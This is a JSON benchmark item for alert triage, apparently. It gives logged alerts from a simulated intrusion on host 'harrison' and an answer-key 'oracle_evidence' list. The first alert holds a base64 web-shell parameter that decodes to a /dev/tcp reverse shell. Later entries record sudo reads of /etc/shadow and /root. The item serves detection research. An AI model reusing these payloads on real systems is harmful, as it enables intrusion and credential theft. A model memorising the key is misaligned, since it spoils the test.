@@ -1,0 +1,1046 @@
+{
+  "incident_id": "ait-sess-harrison-harrison-0107",
+  "name": "ATTEST-AIT harrison/harrison session 107",
+  "source_benchmark": "ATTEST-AIT-ADS",
+  "source_scenario": "harrison/harrison/session-0107",
+  "alert": {
+    "timestamp": "2022-02-08T08:36:28Z",
+    "host": "harrison",
+    "user": "unknown",
+    "alert_type": "ait_ads_session",
+    "summary": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on harrison (46 alerts; detectors: AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter combination in Audit logs., AMiner: New cred_disp parameter ",
+    "scenario": "harrison"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-02-08T08:36:28Z",
+    "end": "2022-02-08T08:37:08Z",
+    "hosts": [
+      "harrison"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-sess-0001-5b431119",
+        "timestamp": "2022-02-08T08:36:28Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:08:36:28 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjguMTkyLjI0Mi8xMTM0MTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0002-024063ab",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server su[28321]: Successful su for jward by www-data",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0003-e6263147",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server su[28321]: + /dev/pts/0 www-data:jward",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0004-ea773f43",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server su[28321]: pam_unix(su:session): session opened for user jward by (uid=33)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0005-5f7f3882",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server systemd-logind[935]: New session c1 of user jward.",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0006-81622b0b",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server systemd: pam_unix(systemd-user:session): session opened for user jward by (uid=0)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0007-e286332e",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_auth parameter combination in Audit logs.",
+        "message": "type=USER_AUTH msg=audit(1644309398.068:2910): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0008-047d26bb",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1644309398.068:2911): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0009-46792920",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1644309398.084:2912): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0010-16de0dad",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1644309398.396:2913): pid=28322 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"jward\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0011-3f9089f5",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1644309398.396:2914): pid=28322 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"jward\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0012-3544c30b",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New login parameter combination in Audit logs.",
+        "message": "type=LOGIN msg=audit(1644309398.396:2915): pid=28322 uid=0 old-auid=4294967295 auid=1001 tty=(none) old-ses=4294967295 ses=401 res=1",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0013-b05e9fbb",
+        "timestamp": "2022-02-08T08:36:38Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309398.400:2916): pid=28322 uid=0 auid=1001 ses=401 msg='op=PAM:session_open acct=\"jward\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0014-9db5fb3f",
+        "timestamp": "2022-02-08T08:36:39Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New service_start parameter combination in Audit logs.",
+        "message": "type=SERVICE_START msg=audit(1644309399.048:2917): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=user@1001 comm=\"systemd\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0015-7ecb11aa",
+        "timestamp": "2022-02-08T08:36:39Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309399.052:2918): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0016-37b0aafa",
+        "timestamp": "2022-02-08T08:36:54Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:54 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=list",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0017-1176605d",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:57 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0018-02892962",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:57 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0019-f7cc9ea5",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:57 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0020-fefee643",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1644309417.304:2919): pid=28346 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=636174202F6574632F736861646F77 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0021-47b9c4dd",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1644309417.304:2919): pid=28346 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=636174202F6574632F736861646F77 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0022-b8ce3e02",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1644309417.308:2920): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0023-d8487543",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1644309417.308:2920): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0024-a8b268d2",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309417.308:2921): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0025-d60bd760",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1644309417.324:2922): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0026-38e071e7",
+        "timestamp": "2022-02-08T08:36:57Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1644309417.324:2923): pid=28346 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0027-4a789fbd",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:59 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/bin/ls -laR /root/",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0028-f4411251",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:59 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0029-d547d4c7",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:59 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0030-38111fd8",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1644309419.748:2924): pid=28348 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C6152202F726F6F742F terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0031-a8093361",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1644309419.748:2924): pid=28348 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C6152202F726F6F742F terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0032-26c7297d",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1644309419.748:2925): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0033-31e664a7",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1644309419.748:2925): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0034-55ca1290",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309419.748:2926): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0035-f7e137f0",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1644309419.972:2927): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0036-dd4be10e",
+        "timestamp": "2022-02-08T08:36:59Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1644309419.972:2928): pid=28348 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0037-58782062",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:37:08 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/bin/ls -l /home",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0038-d7444a0b",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:37:08 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0039-8613c113",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:37:08 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0040-303fde6d",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=USER_CMD msg=audit(1644309428.599:2929): pid=28352 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C202F686F6D65 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0041-16829cef",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_cmd parameter combination in Audit logs.",
+        "message": "type=USER_CMD msg=audit(1644309428.599:2929): pid=28352 uid=1001 auid=4294967295 ses=4294967295 msg='cwd=\"/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02\" cmd=6C73202D6C202F686F6D65 terminal=pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0042-97dc3c53",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "type=CRED_REFR msg=audit(1644309428.599:2930): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0043-8f9acc07",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_refr parameter combination in Audit logs.",
+        "message": "type=CRED_REFR msg=audit(1644309428.599:2930): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0044-459b14d9",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309428.599:2931): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0045-743aafbf",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New user_end parameter combination in Audit logs.",
+        "message": "type=USER_END msg=audit(1644309428.607:2932): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0046-8d340638",
+        "timestamp": "2022-02-08T08:37:08Z",
+        "host": "harrison",
+        "source": "alerts",
+        "detector": "AMiner: New cred_disp parameter combination in Audit logs.",
+        "message": "type=CRED_DISP msg=audit(1644309428.611:2933): pid=28352 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-sess-0001-5b431119",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:28Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:08:36:28 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjguMTkyLjI0Mi8xMTM0MTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0002-024063ab",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server su[28321]: Successful su for jward by www-data",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0003-e6263147",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server su[28321]: + /dev/pts/0 www-data:jward",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0004-ea773f43",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server su[28321]: pam_unix(su:session): session opened for user jward by (uid=33)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0005-5f7f3882",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server systemd-logind[935]: New session c1 of user jward.",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0006-81622b0b",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:38 intranet-server systemd: pam_unix(systemd-user:session): session opened for user jward by (uid=0)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0007-e286332e",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_auth parameter combination in Audit logs.",
+        "message": "type=USER_AUTH msg=audit(1644309398.068:2910): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0008-047d26bb",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1644309398.068:2911): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0009-46792920",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1644309398.084:2912): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0010-16de0dad",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1644309398.396:2913): pid=28322 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"jward\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0011-3f9089f5",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1644309398.396:2914): pid=28322 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"jward\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0012-3544c30b",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New login parameter combination in Audit logs.",
+        "message": "type=LOGIN msg=audit(1644309398.396:2915): pid=28322 uid=0 old-auid=4294967295 auid=1001 tty=(none) old-ses=4294967295 ses=401 res=1",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0013-b05e9fbb",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:38Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309398.400:2916): pid=28322 uid=0 auid=1001 ses=401 msg='op=PAM:session_open acct=\"jward\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0014-9db5fb3f",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:39Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New service_start parameter combination in Audit logs.",
+        "message": "type=SERVICE_START msg=audit(1644309399.048:2917): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=user@1001 comm=\"systemd\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0015-7ecb11aa",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:39Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1644309399.052:2918): pid=28321 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"jward\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/0 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0016-37b0aafa",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:54Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:54 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=list",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0017-1176605d",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:57 intranet-server sudo:    jward : TTY=pts/0 ; PWD=/var/www/intranet.mannsmith.harrison.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0018-02892962",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:57 intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0019-f7cc9ea5",
+      "source": "alerts",
+      "timestamp": "2022-02-08T08:36:57Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  8 08:36:57 intranet-server sudo: pam_unix(sudo:session): session closed for user root",
+        "sensor": "aminer"
+      }
+    },
